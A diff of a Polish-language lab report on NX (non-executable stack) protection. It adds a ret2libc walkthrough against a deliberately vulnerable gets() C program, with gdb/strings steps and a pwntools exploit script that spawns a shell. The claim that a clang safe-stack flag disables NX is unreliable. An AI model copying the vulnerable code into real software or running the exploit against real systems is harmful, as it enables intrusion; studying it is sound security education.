@@ -4,7 +4,7 @@
 
 `Executable space protection`, w bezpieczeństwie systemów i oprogramowania, odnosi się do oznaczania regionów pamięci jako `niewykonywalen` - `non-executable`. W wyniku takiego oznaczenia wykonywanie kodu maszynowego z regionu tak oznaczonego zakończy się wzniesieniem wyjątku. 
 
-
+W proceorach `AMD` technologia nazwana jest jako "Enhanced Virus Protection", u Intela natomiast jako "XD (eXecute Disabled) bit". 
 
 Oznacza to, że w przypadku ataków BOF, podczas których najczęściej wstrzykujemy kod na stos, który następnie chcemy wykonać jest niemożliwe. Przykład takiego exploitu zadenmonstruję w kolejnych punktach.
 
@@ -24,6 +24,8 @@ W przypadku użycia najnowszego `gcc` metoda NX jest defaultowo włączona. Istn
 W przypadku użycia kompilatora `clang` metoda NX jest również defaultowo włączona. Równiez isnitje możliwosć wyłączenia tej metody, poprzez flagę `-fsanitize=safe-stack`.
 
 ## 4. Porównanie metody w Linux vs Windows
+
+
 
 
 
@@ -48,7 +50,8 @@ Kodpodatnej aplikacji. Podatność znajduje się w funkcji `vuln`, w której wyw
 #include <stdio.h>
 #include <string.h>
 
-void vuln(){
+void vuln()
+{
 	char buffer[16];
 	gets(buffer);
 	printf("Buffer = %p", buffer);
@@ -168,7 +171,8 @@ Kod podatnej aplikacji. Tak jak w poprzedniej wersji, podatnością jest `gets()
 #include <stdio.h>
 #include <string.h>
 
-void vuln(){
+void vuln()
+{
         char buffer[16];
         gets(buffer);
         printf("Buffer = %p", buffer);
@@ -180,9 +184,72 @@ int main(int argc, char *argv[])
         return 0;
 }
 ```
-Padding został odnaleziony w taki sam sposób
 
 
 
 
 
+Aby dokonać exploitacji takiego programu należy:
+* wyliczyć padding
+* odnaleźć w adres syscall `system()`
+* (opcjonalnie) odnaleźć adres syscalla `exit()`
+* odnaleźć adres `/bin/sh`
+
+Padding został odnaleziony w taki sam sposób, jak w poprzednim ataku.
+
+Do odnalezienia adresu `system()` posłuzyłem się `gdb`. Po zbreakowaniu się na funkcji `vuln()` i rozpoczęciu programu mogłem sprawdzić adres `system()` w aplikacji używając do tego `print system`.
+
+![](/pictures/2_system_adr.png)
+
+Aby odnależć adres `/bin/sh` posłużyłem się komendą `ldd vuln-protected`, która zwraca jaki linker używa aplikacja wraz z adresem poczatku w pamieci linkera. Użyłem równiez koemndy `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'` aby odnależć adres 	`/bin/sh` w libc. 
+
+![](/pictures/2_libc_binsh.png)
+
+Następnie aby obliczyć adres `/bin/sh` w aplikacji należy dodać do adresu `libc.so.6` offset `/bin/sh`.
+
+![](/pictures/2_addres_binsh.png)
+
+Aby sprawdzić, czy odpowiednio wyliczyłem adres w `gdb` sprawdziłem co znajduje się pod tym adresem. Jak widać poniżej, poprawnie udało się obliczyć adres.
+
+
+![](/pictures/2_gdb_addres_binsh.png)
+
+Syscall `exit()` nie jest obowiązkowy, bez tego dalej uda się nam dostać shella. Jednakże wychodząc z shella otrzymamy `SIGSEGV`. Aby wyjśc z shella bez tego sygnału, należy umieścić na stacku równiez adres `exit()`. Adres ten odnalazłem w identyczny sposób, jak adres `system()`. 
+
+Zatem finalny wysyłany payload jest postaci:
+
+padding + system_addres + exit_addres + bin_sh_addres
+
+Kod exploita:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGG"
+
+system_addres = 0xf7e10040 
+
+exit_addres = 0xf7dcb000- 0x18c33c
+
+bin_sh_addres = 0xf7f5733c
+
+send = padding + p32(system_addres) + p32(exit_addres) + p32(bin_sh_addres) 
+
+p = process('./vuln-protected')
+p.sendline(send)
+p.interactive()
+```
+
+
+
+
+Jak widać na poniższym screenshot-cie, udało się dostać shella, pomimo włączonego zabezpieczenia NX.
+
+![](pictures/2_whoami.png)
+
+
+## 6. Podsumowanie
+
+Metoda zabezpieczania stosu przed jego wykonaniem jest dobrą metodą, utrudnia exploitacje programu. Niestety jednak, nie zapewnie 100% skuteczności. Metoda ta powinna być jedną z wielu sposobów na chronienie aplikacji.
